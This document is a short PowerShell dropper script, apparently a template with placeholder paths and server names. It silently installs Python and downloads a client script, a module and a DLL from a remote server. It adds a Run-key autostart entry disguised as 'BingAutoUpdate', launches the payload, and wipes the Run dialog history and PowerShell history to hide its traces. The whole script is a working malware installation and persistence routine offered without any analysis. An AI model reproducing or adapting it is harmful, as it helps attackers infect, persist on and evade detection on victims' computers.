# --- Set up environment 
$dir = "$env:localappdata\.your_malware_directory"
$python = "$env:localappdata\Programs\Python\Python312"

Get-ChildItem -Path $dir -Recurse | Remove-Item -Force -Recurse

if (-not (Test-Path -Path $dir)) {
  New-Item -Path $dir -ItemType Directory
}


# --- Install python if not installed
if (-not (Test-Path -Path "$python")) {
  $pythonVersion = "3.12.8"
  $installerName = "python-$pythonVersion-amd64.exe"
  $pythonInstallerUrl = "https://www.python.org/ftp/python/$pythonVersion/$installerName"
  $installerPath = "$env:TEMP\$installerName"

  Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $installerPath
  Start-Process -FilePath $installerPath -ArgumentList "/quiet", "InstallAllUsers=0", "PrependPath=0" -Wait

  Remove-Item $installerPath
}


# --- Download required files
$url = "https://your_server.com"

iwr "$url/api/static/client.pyw" -OutFile "$dir\client.pyw"
iwr "$url/api/static/module.pyd" -OutFile "$dir\mediaplayer.cp312-win_amd64.pyd"
iwr "$url/api/static/client.dll" -OutFile "$dir\core.dll"


# --- Add file to autostart and start a python process
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "BingAutoUpdate" -Value "$python\pythonw.exe $dir\client.pyw" -Type String
Start-Process -FilePath "$python\pythonw.exe" -ArgumentList "$dir\client.pyw"


# --- Clean up
$MRU = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
if (Test-Path -Path $MRU) {
  Remove-Item -Path $MRU -Recurse
}

$PSReadLineHistory = "$env:appdata\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path -Path $PSReadLineHistory) {
  Remove-Item -Path $PSReadLineHistory
}
